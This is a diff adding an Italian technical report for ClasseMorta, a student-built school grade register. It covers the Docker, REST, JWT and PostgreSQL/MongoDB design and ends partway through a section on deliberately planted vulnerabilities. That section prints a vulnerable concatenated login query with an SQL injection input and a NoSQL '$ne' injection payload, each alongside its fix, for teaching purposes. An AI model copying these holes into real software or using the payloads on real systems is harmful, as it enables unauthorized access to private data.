@@ -1,0 +1,823 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="UTF-8">
+<title>ClasseMorta - Relazione tecnica</title>
+<style>
+    @page {
+        size: A4;
+        margin: 22mm 18mm 22mm 18mm;
+    }
+    * { box-sizing: border-box; }
+    html, body {
+        margin: 0;
+        padding: 0;
+        font-family: "Georgia", "Times New Roman", serif;
+        font-size: 11pt;
+        line-height: 1.55;
+        color: #1f1f24;
+        background: white;
+    }
+
+    h1, h2, h3, h4 {
+        font-family: "Helvetica", "Arial", sans-serif;
+        color: #6b0014;
+        line-height: 1.25;
+        page-break-after: avoid;
+    }
+    h1 { font-size: 24pt; margin: 0 0 6pt; }
+    h2 { font-size: 16pt; margin: 22pt 0 8pt; border-bottom: 2px solid #c8102e; padding-bottom: 4pt; }
+    h3 { font-size: 13pt; margin: 16pt 0 6pt; color: #8a0019; }
+    h4 { font-size: 11pt; margin: 12pt 0 4pt; color: #8a0019; }
+
+    p { margin: 0 0 8pt; text-align: justify; }
+    ul, ol { margin: 4pt 0 8pt 22pt; padding: 0; }
+    li { margin-bottom: 3pt; }
+
+    code {
+        font-family: "Menlo", "Consolas", monospace;
+        background: #f3eff0;
+        padding: 1pt 4pt;
+        border-radius: 3pt;
+        font-size: 9.5pt;
+        color: #6b0014;
+    }
+    pre {
+        background: #faf5f6;
+        border: 1px solid #e3d3d6;
+        border-left: 3pt solid #c8102e;
+        padding: 8pt 10pt;
+        font-family: "Menlo", "Consolas", monospace;
+        font-size: 9pt;
+        line-height: 1.4;
+        white-space: pre-wrap;
+        word-wrap: break-word;
+        page-break-inside: avoid;
+        margin: 8pt 0;
+    }
+    pre code { background: transparent; padding: 0; color: #1f1f24; }
+
+    table {
+        border-collapse: collapse;
+        width: 100%;
+        font-size: 9.5pt;
+        margin: 8pt 0 14pt;
+        page-break-inside: avoid;
+    }
+    th, td {
+        border: 1px solid #d8c8cb;
+        padding: 5pt 7pt;
+        text-align: left;
+        vertical-align: top;
+    }
+    th {
+        background: #fbe1e5;
+        color: #6b0014;
+        font-weight: 700;
+    }
+    tr:nth-child(even) td { background: #fdf6f7; }
+
+    blockquote {
+        margin: 8pt 0;
+        padding: 6pt 12pt;
+        border-left: 3pt solid #c8102e;
+        background: #faf5f6;
+        font-style: italic;
+        color: #4a4a55;
+    }
+
+    .copertina {
+        page-break-after: always;
+        text-align: center;
+        padding-top: 60pt;
+    }
+    .copertina h1 {
+        font-size: 36pt;
+        margin: 0;
+        letter-spacing: 1pt;
+    }
+    .copertina .sub {
+        font-size: 14pt;
+        color: #4a4a55;
+        margin-top: 14pt;
+        font-style: italic;
+        font-family: "Georgia", serif;
+    }
+    .copertina .motto {
+        margin-top: 30pt;
+        font-size: 13pt;
+        color: #4a4a55;
+    }
+    .copertina .meta {
+        margin-top: 120pt;
+        font-size: 11pt;
+        color: #2a2a30;
+        line-height: 1.9;
+    }
+    .copertina .meta b { color: #6b0014; }
+
+    .toc { page-break-after: always; }
+    .toc ol { list-style: none; margin-left: 0; padding-left: 0; }
+    .toc li { margin: 4pt 0; }
+    .toc li b { color: #6b0014; }
+
+    .grid-two {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 10pt;
+    }
+    .box {
+        border: 1px solid #d8c8cb;
+        border-radius: 4pt;
+        padding: 8pt 10pt;
+        background: #faf5f6;
+        font-size: 10pt;
+        page-break-inside: avoid;
+    }
+    .box h4 { margin-top: 0; color: #6b0014; }
+
+    .warn {
+        background: #fff5e6;
+        border-left: 3pt solid #d97706;
+        padding: 8pt 12pt;
+        font-size: 10pt;
+        margin: 8pt 0;
+    }
+
+    .pagebreak { page-break-before: always; }
+
+    /* Diagramma ASCII contenuto */
+    .diagram {
+        font-family: "Menlo", "Consolas", monospace;
+        font-size: 8.5pt;
+        line-height: 1.35;
+        background: #faf5f6;
+        border: 1px solid #e3d3d6;
+        padding: 10pt;
+        white-space: pre;
+        text-align: center;
+        page-break-inside: avoid;
+        margin: 8pt 0;
+    }
+</style>
+</head>
+<body>
+
+<!-- =================== COPERTINA =================== -->
+<div class="copertina">
+    <h1>ClasseMorta</h1>
+    <div class="sub">Registro elettronico didattico</div>
+    <div class="motto">«Il cuore pulsante della scuola del passato»</div>
+
+    <div class="meta">
+        <b>Relazione tecnica</b><br>
+        Progetto TPSIT &middot; classe 5INB<br>
+        Anno scolastico 2025/2026<br><br>
+        Stack: PHP &middot; PostgreSQL &middot; MongoDB &middot; Docker &middot; Railway
+    </div>
+</div>
+
+<!-- =================== INDICE =================== -->
+<div class="toc">
+<h2>Indice</h2>
+<ol>
+    <li><b>1.</b> Panoramica del progetto</li>
+    <li><b>2.</b> Architettura: front-end e back-end separati in Docker</li>
+    <li><b>3.</b> API REST</li>
+    <li><b>4.</b> JWT e autenticazione Bearer</li>
+    <li><b>5.</b> Database SQL: PostgreSQL su Neon</li>
+    <li><b>6.</b> Database NoSQL: MongoDB Atlas</li>
+    <li><b>7.</b> SQL vs NoSQL: differenze principali</li>
+    <li><b>8.</b> Motivazioni della scelta NoSQL per i voti</li>
+    <li><b>9.</b> Vantaggi e svantaggi nel contesto del progetto</li>
+    <li><b>10.</b> Vulnerabilità didattiche</li>
+    <li><b>11.</b> Conclusioni</li>
+</ol>
+</div>
+
+<!-- =================== 1. PANORAMICA =================== -->
+<h2>1. Panoramica del progetto</h2>
+
+<p>
+<b>ClasseMorta</b> è un registro elettronico scolastico ispirato a
+<i>ClasseViva</i>, sviluppato come progetto didattico per il corso di TPSIT.
+L'applicazione permette a professori e studenti di gestire studenti, voti,
+verifiche con domande aperte e relative risposte.
+</p>
+
+<p>
+Oltre a essere un esempio di applicazione full-stack con persistenza
+relazionale e documentale, il progetto integra <b>tre vulnerabilità
+volutamente introdotte</b> a scopo dimostrativo: <i>SQL injection</i> sul
+login, <i>NoSQL injection</i> sulla lettura dei voti, <i>Stored XSS</i>
+sulle risposte delle verifiche. Il loro scopo è permettere di studiare,
+sfruttare e correggere errori realistici di sicurezza in un ambiente
+controllato.
+</p>
+
+<h3>1.1 Funzionalità principali</h3>
+<ul>
+    <li>Login distinto per <b>studenti</b> e <b>professori</b>, autenticato con JWT firmato HS256.</li>
+    <li>Dashboard contestuale al ruolo dell'utente (vista prof / vista studente).</li>
+    <li>Gestione studenti per classe, visibile solo al docente che insegna in quella classe.</li>
+    <li>Inserimento, lettura e cancellazione voti, memorizzati in <b>MongoDB</b>.</li>
+    <li>Creazione di verifiche con domande aperte e raccolta delle risposte degli studenti.</li>
+    <li>Login alternativo "fittizio" SPID/CIE: aprono un QR code che reindirizza a una pagina meme.</li>
+</ul>
+
+<h3>1.2 Stack tecnologico</h3>
+<table>
+    <thead>
+        <tr><th>Componente</th><th>Tecnologia</th><th>Note</th></tr>
+    </thead>
+    <tbody>
+        <tr><td>Back-end</td><td>PHP 8.2 + Apache</td><td>Router REST custom, no framework</td></tr>
+        <tr><td>Front-end</td><td>HTML / CSS / JavaScript vanilla</td><td>Servito da Nginx</td></tr>
+        <tr><td>RDBMS</td><td>PostgreSQL (Neon, serverless)</td><td>Utenti, classi, verifiche</td></tr>
+        <tr><td>NoSQL</td><td>MongoDB Atlas</td><td>Collezione voti</td></tr>
+        <tr><td>Sessioni</td><td>JWT (HS256)</td><td>Stateless, scadenza 1h</td></tr>
+        <tr><td>Async</td><td>fetch + XMLHttpRequest</td><td>Entrambe presenti</td></tr>
+        <tr><td>Container</td><td>Docker</td><td>Due immagini: backend + frontend</td></tr>
+        <tr><td>Hosting</td><td>Railway</td><td>Deploy continuo da Git</td></tr>
+    </tbody>
+</table>
+
+<!-- =================== 2. ARCHITETTURA =================== -->
+<div class="pagebreak"></div>
+<h2>2. Architettura: front-end e back-end separati in Docker</h2>
+
+<p>
+L'applicazione adotta un'architettura <b>decoupled</b> classica delle
+moderne Single Page e Multi Page Application: il back-end espone
+esclusivamente API REST in JSON, mentre il front-end è un set di pagine
+HTML statiche che invocano le API in modo asincrono.
+I due moduli sono <b>completamente indipendenti</b>: ciascuno ha il proprio
+container Docker, il proprio Dockerfile e — in produzione su Railway —
+un proprio dominio pubblico.
+</p>
+
+<h3>2.1 Diagramma logico</h3>
+<div class="diagram">
+        ┌──────────────┐         HTTPS         ┌────────────────────┐
+        │   Browser    │ ◄───────────────────► │ Frontend (Nginx)   │
+        │  (utente)    │      pagine HTML      │  contenitore #1    │
+        └──────┬───────┘                       └────────────────────┘
+               │
+               │  fetch / XHR (JSON + Bearer JWT)
+               ▼
+        ┌──────────────────────┐
+        │  Backend (Apache)    │     PDO       ┌────────────────────┐
+        │  PHP 8.2 - REST API  │ ───────────► │ PostgreSQL (Neon)  │
+        │   contenitore #2     │  Mongo Driver └────────────────────┘
+        │                      │ ───────────► ┌────────────────────┐
+        └──────────────────────┘              │ MongoDB Atlas      │
+                                              └────────────────────┘
+</div>
+
+<h3>2.2 Container Docker</h3>
+
+<div class="grid-two">
+    <div class="box">
+        <h4>Frontend</h4>
+        <p><b>Base image:</b> <code>nginx:alpine</code></p>
+        <p><b>Ruolo:</b> serve i file statici di <code>frontend/</code> (HTML, CSS, JS, immagini).</p>
+        <p><b>Vantaggio:</b> immagine minimale (~20 MB), parte in millisecondi.</p>
+        <p><b>Configurazione:</b> <code>default.conf</code> con <code>try_files</code> per servire le pagine SPA-style.</p>
+    </div>
+    <div class="box">
+        <h4>Backend</h4>
+        <p><b>Base image:</b> <code>php:8.2-apache</code></p>
+        <p><b>Estensioni:</b> <code>pdo_pgsql</code> per Postgres, <code>mongodb</code> (PECL) per Mongo.</p>
+        <p><b>Ruolo:</b> espone le rotte <code>/api/*</code>.</p>
+        <p><b>Entrypoint:</b> script shell che forza un singolo MPM (prefork) e sostituisce la porta di Apache con <code>$PORT</code> di Railway.</p>
+    </div>
+</div>
+
+<h3>2.3 Vantaggi della separazione</h3>
+<ul>
+    <li><b>Indipendenza dei deploy:</b> aggiornare la sola UI non comporta downtime del back-end e viceversa.</li>
+    <li><b>Scalabilità separata:</b> il frontend statico può essere replicato a costo zero, l'API può essere scalata in modo indipendente quando il carico cresce.</li>
+    <li><b>Linguaggi specializzati:</b> ciascun componente usa il server ottimale per il suo scopo (Nginx per file statici, Apache + PHP per logica server-side).</li>
+    <li><b>Sicurezza:</b> il front-end non ha mai accesso diretto ai database, riducendo la superficie d'attacco.</li>
+    <li><b>Sviluppo parallelo:</b> il contratto è l'API REST, definita una volta; chi lavora sull'interfaccia e chi lavora sui dati possono procedere in autonomia.</li>
+</ul>
+
+<h3>2.4 Sviluppo locale e deploy</h3>
+<p>
+In locale i due servizi girano insieme tramite <code>docker-compose</code>:
+il frontend è accessibile su <code>localhost:3000</code>, il backend su
+<code>localhost:8080</code>. In produzione, su <b>Railway</b>, ogni servizio
+è un container separato con il proprio dominio <code>*.up.railway.app</code>;
+la variabile <code>API_URL</code> del front-end è impostata sull'origin
+del back-end.
+</p>
+
+<!-- =================== 3. API REST =================== -->
+<div class="pagebreak"></div>
+<h2>3. API REST</h2>
+
+<p>
+REST (<i>Representational State Transfer</i>) è uno <b>stile architetturale</b>
+per la progettazione di servizi web definito da Roy Fielding nel 2000.
+Si basa sul protocollo HTTP e applica alcuni principi cardine:
+</p>
+
+<ul>
+    <li><b>Risorse identificate da URL univoci</b> (es. <code>/api/studenti/3</code>).</li>
+    <li><b>Operazioni espresse dai metodi HTTP</b>: <code>GET</code> per leggere, <code>POST</code> per creare, <code>PUT/PATCH</code> per aggiornare, <code>DELETE</code> per cancellare.</li>
+    <li><b>Stateless:</b> ogni richiesta contiene tutte le informazioni necessarie a essere processata; il server non mantiene sessione.</li>
+    <li><b>Rappresentazione tipizzata:</b> in ClasseMorta tutte le risposte sono <code>application/json</code>.</li>
+    <li><b>Codici di stato HTTP</b> coerenti: <code>200 OK</code>, <code>201 Created</code>, <code>400 Bad Request</code>, <code>401 Unauthorized</code>, <code>403 Forbidden</code>, <code>404 Not Found</code>, <code>500 Internal Server Error</code>.</li>
+</ul>
+
+<h3>3.1 Router del back-end</h3>
+<p>
+Il file <code>backend/index.php</code> agisce da unico front-controller.
+Riceve qualsiasi richiesta (grazie alla regola di rewrite in
+<code>.htaccess</code> che convoglia tutto su <code>index.php</code>),
+ne estrae il path, lo segmenta e instrada l'esecuzione al controller
+appropriato. La logica è un semplice <code>switch</code> sul secondo
+segmento (<code>$resource</code>):
+</p>
+
+<pre><code>$path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
+$segments = array_values(array_filter(explode('/', $path), fn($s) => $s !== ''));
+$resource = $segments[1] ?? '';
+
+switch ($resource) {
+    case 'login':     (new AuthController())->login();        break;
+    case 'studenti':  ...                                     break;
+    case 'voti':      ...                                     break;
+    case 'verifiche': ...                                     break;
+    default:          http_response_code(404); ...
+}</code></pre>
+
+<h3>3.2 Mappa degli endpoint</h3>
+<table>
+    <thead>
+        <tr><th>Metodo</th><th>Endpoint</th><th>Ruolo</th><th>Descrizione</th></tr>
+    </thead>
+    <tbody>
+        <tr><td>POST</td><td><code>/api/login</code></td><td>pubblico</td><td>Restituisce JWT</td></tr>
+        <tr><td>GET</td><td><code>/api/me</code></td><td>auth</td><td>Dati utente loggato</td></tr>
+        <tr><td>GET</td><td><code>/api/classi</code></td><td>professore</td><td>Classi e materie del prof</td></tr>
+        <tr><td>GET</td><td><code>/api/studenti?classe=5A</code></td><td>professore</td><td>Studenti della classe</td></tr>
+        <tr><td>GET</td><td><code>/api/voti?studente_id=:id</code></td><td>auth</td><td>Voti dello studente (MongoDB)</td></tr>
+        <tr><td>POST</td><td><code>/api/voti</code></td><td>professore</td><td>Inserisce un voto</td></tr>
+        <tr><td>DELETE</td><td><code>/api/voti/:id</code></td><td>professore</td><td>Elimina un voto</td></tr>
+        <tr><td>GET</td><td><code>/api/verifiche</code></td><td>auth</td><td>Verifiche contestuali al ruolo</td></tr>
+        <tr><td>POST</td><td><code>/api/verifiche</code></td><td>professore</td><td>Crea una verifica</td></tr>
+        <tr><td>GET</td><td><code>/api/verifiche/:id</code></td><td>auth</td><td>Dettaglio verifica</td></tr>
+        <tr><td>POST</td><td><code>/api/verifiche/:id/risposte</code></td><td>studente</td><td>Consegna risposte</td></tr>
+        <tr><td>GET</td><td><code>/api/verifiche/:id/risposte</code></td><td>professore</td><td>Review risposte</td></tr>
+    </tbody>
+</table>
+
+<h3>3.3 Chiamate asincrone dal client</h3>
+<p>
+Il front-end accede alle API in modalità <i>asynchronous</i>. Entrambe le
+tecnologie richieste dalla traccia sono presenti:
+</p>
+<ul>
+    <li>Funzione <code>apiFetch()</code> in <code>app.js</code> basata su <b>Fetch API</b> e <code>async/await</code>: usata in quasi tutte le pagine.</li>
+    <li>Funzione <code>apiXHR()</code> in <code>app.js</code> basata su <b>XMLHttpRequest</b>: usata nella pagina <code>studenti.html</code>.</li>
+</ul>
+<p>
+Entrambe le funzioni aggiungono in automatico l'header
+<code>Authorization: Bearer &lt;jwt&gt;</code> se l'utente è loggato, e
+gestiscono in modo centralizzato i redirect su <code>401</code> e la
+serializzazione del corpo JSON.
+</p>
+
+<!-- =================== 4. JWT =================== -->
+<div class="pagebreak"></div>
+<h2>4. JWT e autenticazione Bearer</h2>
+
+<p>
+Un <b>JSON Web Token</b> è un formato standardizzato (RFC 7519) per
+rappresentare un insieme di <i>claim</i> (affermazioni) firmati
+crittograficamente. Per ClasseMorta è la base del sistema di sessioni:
+il backend non mantiene nessuno stato di login, perché tutte le
+informazioni necessarie per identificare l'utente viaggiano nel token,
+firmate digitalmente.
+</p>
+
+<h3>4.1 Struttura del token</h3>
+<p>
+Un JWT è composto da tre parti separate da un punto:
+<code>HEADER.PAYLOAD.SIGNATURE</code>, ognuna codificata in Base64-URL.
+</p>
+
+<pre><code>// Esempio (decodificato)
+
+HEADER:    { "alg": "HS256", "typ": "JWT" }
+
+PAYLOAD:   {
+    "sub": 1,
+    "email": "mario.rossi@scuola.it",
+    "nome": "Mario",
+    "cognome": "Rossi",
+    "ruolo": "professore",
+    "iat": 1715350000,
+    "exp": 1715353600
+}
+
+SIGNATURE: HMAC_SHA256(
+    base64Url(HEADER) + "." + base64Url(PAYLOAD),
+    JWT_SECRET
+)</code></pre>
+
+<p>
+La firma è calcolata applicando <code>HMAC-SHA256</code> all'unione di
+header e payload, usando come chiave la variabile d'ambiente
+<code>JWT_SECRET</code>. Chi riceve il token può ricalcolare la firma
+e confrontarla con quella ricevuta: se coincidono, il token è autentico
+e non è stato manomesso.
+</p>
+
+<h3>4.2 Bearer scheme</h3>
+<p>
+La <i>Bearer Authentication</i> (RFC 6750) prescrive che il client, una
+volta ottenuto il token, lo includa nelle richieste tramite l'header
+HTTP <code>Authorization</code>:
+</p>
+<pre><code>Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEs...</code></pre>
+<p>
+Il termine <i>bearer</i> ("portatore") implica che chiunque possieda il
+token è autorizzato come l'utente: per questo motivo il token deve
+essere trasmesso solo su HTTPS e custodito al sicuro lato client. In
+ClasseMorta viene memorizzato in <code>localStorage</code> (scelta
+comoda, ma esposta a XSS — il che è esattamente ciò che dimostra la
+vulnerabilità Stored XSS sulle risposte di verifica).
+</p>
+
+<h3>4.3 Flusso di autenticazione</h3>
+<ol>
+    <li>L'utente invia <code>POST /api/login</code> con email, password e ruolo.</li>
+    <li>Il backend verifica le credenziali su Postgres, costruisce il payload e firma il JWT.</li>
+    <li>La risposta contiene <code>{ token, token_type: "Bearer", expires_in: 3600, utente }</code>.</li>
+    <li>Il client salva il token e lo include in tutte le richieste successive.</li>
+    <li>Su ogni rotta protetta, la funzione middleware <code>richiediAuth()</code> verifica firma e scadenza, e — se richiesto — controlla che il ruolo dell'utente sia tra quelli ammessi.</li>
+    <li>Allo scadere (1 h) o se l'utente esegue <i>logout</i>, il token viene scartato.</li>
+</ol>
+
+<h3>4.4 Confronto con sessioni cookie-based</h3>
+<table>
+    <thead>
+        <tr><th>Aspetto</th><th>Sessione lato server</th><th>JWT</th></tr>
+    </thead>
+    <tbody>
+        <tr><td>Stato</td><td>Memorizzato in DB / cache</td><td>Tutto nel token (stateless)</td></tr>
+        <tr><td>Scalabilità</td><td>Richiede session store condiviso</td><td>Nessuno stato condiviso necessario</td></tr>
+        <tr><td>Trasporto tipico</td><td>Cookie HttpOnly</td><td>Header Authorization</td></tr>
+        <tr><td>Revoca</td><td>Immediata (cancellando in DB)</td><td>Difficile prima della scadenza</td></tr>
+        <tr><td>Adatto a</td><td>Web tradizionale, server-rendered</td><td>SPA, mobile, micro-servizi</td></tr>
+    </tbody>
+</table>
+
+<!-- =================== 5. POSTGRES =================== -->
+<div class="pagebreak"></div>
+<h2>5. Database SQL: PostgreSQL su Neon</h2>
+
+<p>
+La parte <i>strutturata</i> dei dati — utenti, classi, materie,
+insegnamenti, verifiche, domande e risposte — è memorizzata in
+<b>PostgreSQL</b>, ospitato sulla piattaforma serverless
+<i>Neon</i>. Lo schema utilizza chiavi primarie auto-incrementanti
+(<code>SERIAL</code>), vincoli di unicità sulle email e diverse
+foreign key con <code>ON DELETE CASCADE</code> per garantire
+l'integrità referenziale.
+</p>
+
+<h3>5.1 Schema essenziale</h3>
+<table>
+    <thead>
+        <tr><th>Tabella</th><th>Contenuto</th><th>Relazioni</th></tr>
+    </thead>
+    <tbody>
+        <tr><td><code>professori</code></td><td>Anagrafica docenti</td><td>—</td></tr>
+        <tr><td><code>studenti</code></td><td>Anagrafica studenti + classe</td><td>—</td></tr>
+        <tr><td><code>materie</code></td><td>Catalogo materie</td><td>—</td></tr>
+        <tr><td><code>insegnamenti</code></td><td>Quale prof insegna quale materia in quale classe</td><td>FK: professori, materie</td></tr>
+        <tr><td><code>verifiche</code></td><td>Verifiche assegnate</td><td>FK: professori, materie</td></tr>
+        <tr><td><code>domande</code></td><td>Domande aperte di una verifica</td><td>FK: verifiche</td></tr>
+        <tr><td><code>risposte</code></td><td>Risposte degli studenti</td><td>FK: domande, studenti</td></tr>
+    </tbody>
+</table>
+
+<h3>5.2 Connessione</h3>
+<p>
+La connessione avviene tramite <b>PDO</b> con il driver
+<code>pgsql</code>. Le credenziali sono lette dal file <code>.env</code>
+(in locale) o dalle variabili d'ambiente del container (in cloud).
+La connessione richiede TLS (<code>sslmode=require</code>) perché Neon
+non accetta connessioni in chiaro.
+</p>
+
+<!-- =================== 6. MONGO =================== -->
+<h2>6. Database NoSQL: MongoDB Atlas</h2>
+
+<p>
+I <b>voti</b> sono invece memorizzati in <b>MongoDB Atlas</b>, in una
+singola collezione <code>voti</code> del database <code>classeMorta</code>.
+Ogni voto è un documento JSON-like:
+</p>
+
+<pre><code>{
+    "_id": ObjectId("664a..."),
+    "studente_id":  1,
+    "professore_id": 2,
+    "materia": "Italiano",
+    "voto": 7.5,
+    "descrizione": "Interrogazione orale",
+    "data": "2026-04-22T08:45:00Z"
+}</code></pre>
+
+<p>
+Non esiste alcuno schema imposto: ogni documento può, in teoria,
+avere campi diversi. La collezione viene creata automaticamente al
+primo inserimento. La connessione usa l'estensione PECL
+<code>mongodb</code>, con il driver low-level
+<code>MongoDB\Driver\Manager</code>; le operazioni sono incapsulate
+in un piccolo helper (<code>backend/src/helpers/mongo.php</code>) che
+espone le funzioni <code>mongoFind()</code>, <code>mongoInsertOne()</code>
+e <code>mongoDeleteOne()</code>.
+</p>
+
+<!-- =================== 7. SQL VS NOSQL =================== -->
+<div class="pagebreak"></div>
+<h2>7. SQL vs NoSQL: differenze principali</h2>
+
+<p>
+"NoSQL" è un termine ombrello che indica database non relazionali
+(orientati a documenti, colonne, grafi o coppie chiave/valore).
+Quelli più diffusi sono <i>document store</i> come MongoDB, che è il
+caso d'uso del progetto. Le differenze rispetto ai database SQL
+classici sono profonde e toccano modello dati, garanzie transazionali,
+scalabilità e linguaggio di interrogazione.
+</p>
+
+<table>
+    <thead>
+        <tr><th>Aspetto</th><th>SQL (PostgreSQL)</th><th>NoSQL (MongoDB)</th></tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>Modello dati</td>
+            <td>Tabelle con righe e colonne tipizzate</td>
+            <td>Documenti JSON/BSON, schema flessibile</td>
+        </tr>
+        <tr>
+            <td>Schema</td>
+            <td><b>Rigido</b>, definito a priori con <code>CREATE TABLE</code></td>
+            <td><b>Dinamico</b>, può evolvere documento per documento</td>
+        </tr>
+        <tr>
+            <td>Linguaggio</td>
+            <td>SQL standardizzato (ISO/IEC 9075)</td>
+            <td>API specifiche del database (driver, MQL)</td>
+        </tr>
+        <tr>
+            <td>Relazioni</td>
+            <td>Foreign key, <code>JOIN</code> nativi</td>
+            <td>Riferimenti manuali o embedding, no JOIN classico</td>
+        </tr>
+        <tr>
+            <td>Transazioni</td>
+            <td><b>ACID</b> piene su più tabelle</td>
+            <td>ACID solo su singolo documento (limitate)</td>
+        </tr>
+        <tr>
+            <td>Garanzie</td>
+            <td>ACID (Atomicity, Consistency, Isolation, Durability)</td>
+            <td>BASE (Basically Available, Soft state, Eventual consistency)</td>
+        </tr>
+        <tr>
+            <td>Scalabilità</td>
+            <td>Tipicamente <b>verticale</b> (server più potente)</td>
+            <td><b>Orizzontale</b> nativa, sharding integrato</td>
+        </tr>
+        <tr>
+            <td>Adatto a</td>
+            <td>Dati strutturati, relazioni complesse, analisi</td>
+            <td>Dati semi-strutturati, alto throughput, evoluzione rapida</td>
+        </tr>
+        <tr>
+            <td>Esempi</td>
+            <td>PostgreSQL, MySQL, Oracle, SQL Server</td>
+            <td>MongoDB, Couchbase, DynamoDB, Firestore</td>
+        </tr>
+    </tbody>
+</table>
+
+<h3>7.1 ACID vs BASE</h3>
+<p>
+I database relazionali garantiscono <b>ACID</b>: ogni transazione è
+atomica, mantiene la consistenza, è isolata dalle altre e i dati
+sopravvivono ai guasti. I database NoSQL distribuiti privilegiano
+invece la <b>disponibilità</b> e accettano una consistenza
+<i>eventuale</i> (i nodi convergono allo stesso stato dopo un certo
+intervallo, ma non istantaneamente). È un compromesso noto come
+<b>teorema CAP</b> (Consistency, Availability, Partition tolerance):
+in presenza di partizione di rete si può garantire al più due delle
+tre proprietà.
+</p>
+
+<!-- =================== 8. MOTIVAZIONI =================== -->
+<h2>8. Motivazioni della scelta NoSQL per i voti</h2>
+
+<p>
+La scelta di affiancare a Postgres una collezione MongoDB
+specificamente per i <b>voti</b> non è dettata da un capriccio:
+è motivata dalla natura stessa di questi dati e dai requisiti del
+sistema.
+</p>
+
+<ol>
+    <li>
+        <b>Struttura del documento variabile.</b> Un voto può evolvere
+        nel tempo: oggi un campo "voto numerico", domani un "voto in
+        decimi" più un "giudizio descrittivo", dopodomani un array di
+        rubriche di valutazione. Con MongoDB l'evoluzione dello schema
+        è incrementale; con Postgres richiederebbe migration
+        complicate, lock di tabella e versionamento.
+    </li>
+    <li>
+        <b>Volume e frequenza di scrittura.</b> In un registro
+        elettronico reale, i voti sono l'entità con il <i>più alto
+        volume di scrittura</i>: migliaia di voti al giorno per ogni
+        istituto. MongoDB è progettato per ricevere bulk insert ad
+        alta cadenza senza degradare la lettura.
+    </li>
+    <li>
+        <b>Dati pressoché autocontenuti.</b> Un voto fa riferimento a
+        uno studente e a un professore, ma non ha bisogno di partecipare
+        a JOIN complessi con altre tabelle: bastano due "puntatori"
+        (<code>studente_id</code>, <code>professore_id</code>). Il
+        modello documentale è perfetto per oggetti di questo tipo.
+    </li>
+    <li>
+        <b>Separazione dei rischi.</b> Mantenendo i voti separati
+        dalle anagrafiche in un secondo storage, un guasto a uno dei
+        due database non compromette l'intero sistema.
+    </li>
+    <li>
+        <b>Valore didattico.</b> Per il progetto è esplicitamente
+        richiesto di usare <i>sia</i> un RDBMS <i>sia</i> un database
+        NoSQL. La separazione utenti/voti è un caso d'uso realistico
+        per mostrare entrambi.
+    </li>
+</ol>
+
+<!-- =================== 9. VANTAGGI E SVANTAGGI =================== -->
+<div class="pagebreak"></div>
+<h2>9. Vantaggi e svantaggi nel contesto del progetto</h2>
+
+<h3>9.1 Vantaggi osservati</h3>
+
+<div class="grid-two">
+    <div class="box">
+        <h4>Flessibilità di schema</h4>
+        <p>L'aggiunta di nuovi campi al documento voto (per esempio una nota di commento o un tag di tipologia) è banale: basta inserirli e i documenti vecchi restano validi.</p>
+    </div>
+    <div class="box">
+        <h4>Integrazione cloud</h4>
+        <p>Atlas offre tier gratuito M0 con TLS, snapshot e geo-replica: nessuna gestione di server. Per un progetto didattico è quasi senza attriti.</p>
+    </div>
+    <div class="box">
+        <h4>Query JSON-native</h4>
+        <p>Inserire e leggere documenti dalla PHP è quasi trasparente: gli array associativi diventano documenti BSON e viceversa, senza ORM.</p>
+    </div>
+    <div class="box">
+        <h4>Scalabilità orizzontale</h4>
+        <p>Se il numero di voti crescesse, lo sharding su <code>studente_id</code> sarebbe immediato. Difficile da ottenere con Postgres mantenendo i join.</p>
+    </div>
+</div>
+
+<h3>9.2 Svantaggi e compromessi</h3>
+
+<div class="grid-two">
+    <div class="box">
+        <h4>Niente JOIN nativo</h4>
+        <p>Per arricchire un voto con i dati dello studente (es. nome e cognome) servono due query separate o un <code>$lookup</code> di aggregation pipeline. Costo in latenza e codice.</p>
+    </div>
+    <div class="box">
+        <h4>Tipi non vincolati</h4>
+        <p>Nulla impedisce di inserire un voto come stringa anziché numero. Bisogna validare lato applicazione, mentre Postgres lo farebbe automaticamente.</p>
+    </div>
+    <div class="box">
+        <h4>Mancanza di transazioni multi-documento</h4>
+        <p>Nel progetto non è un problema, ma se un giorno volessimo "annullare l'intera verifica e tutti i voti correlati" in modo atomico, Postgres lo farebbe più facilmente.</p>
+    </div>
+    <div class="box">
+        <h4>Superficie di attacco diversa</h4>
+        <p>Le query MongoDB sono oggetti, non stringhe: questo apre la porta alla <b>NoSQL injection</b> via array nidificati nei parametri (operatori come <code>$ne</code>, <code>$gt</code>...).</p>
+    </div>
+</div>
+
+<h3>9.3 Bilancio complessivo</h3>
+<p>
+Nel contesto di ClasseMorta, la scelta NoSQL per i voti si è rivelata
+appropriata: il modello dati è semplice, le query sono uniformi
+(filtra per <code>studente_id</code> e ordina per data), il volume potenziale
+è alto. Lo svantaggio principale — i join — viene mitigato eseguendo
+in parallelo una query Postgres per gli studenti dalla pagina front-end,
+che è già la naturale "vista aggregata" dei dati.
+</p>
+
+<!-- =================== 10. VULNERABILITÀ =================== -->
+<h2>10. Vulnerabilità didattiche</h2>
+
+<p>
+Il progetto contiene <b>tre vulnerabilità volutamente inserite</b>.
+Sono pensate per essere identificate, sfruttate e successivamente
+corrette durante le esercitazioni di sicurezza.
+</p>
+
+<h3>10.1 SQL Injection nel login</h3>
+<p>
+Il metodo <code>Utenti::loginVulnerabile()</code> costruisce la query
+concatenando direttamente le stringhe arrivate dal client:
+</p>
+<pre><code>$sql = "SELECT * FROM $tabella
+        WHERE email = '$email' AND password = '$password' LIMIT 1";</code></pre>
+<p>
+Inserendo come email <code>' OR '1'='1' --</code> la condizione diventa
+sempre vera e il primo record viene autenticato come se fosse il
+legittimo utente. La mitigazione corretta è l'uso di
+<i>prepared statement</i> con <code>PDO::prepare()</code> e
+parametri associati, come avviene nel resto del progetto.
+</p>
+
+<h3>10.2 NoSQL Injection sulla lettura voti</h3>
+<p>
+In <code>VotiController::lista()</code> il valore di
+<code>$_GET['studente_id']</code> viene passato al filtro Mongo
+"così com'è" quando arriva come array:
+</p>
+<pre><code>// Payload didattico:
+//   GET /api/voti?studente_id[$ne]=null
+//
+// PHP costruisce: ['studente_id' => ['$ne' => 'null']]
+// MongoDB interpreta '$ne' come operatore di confronto
+// e restituisce TUTTI i voti di tutti gli studenti.</code></pre>
+<p>
+La fix è verificare che il valore arrivato sia uno scalare
+(con <code>is_scalar()</code>) e in caso contrario rifiutarlo, oltre
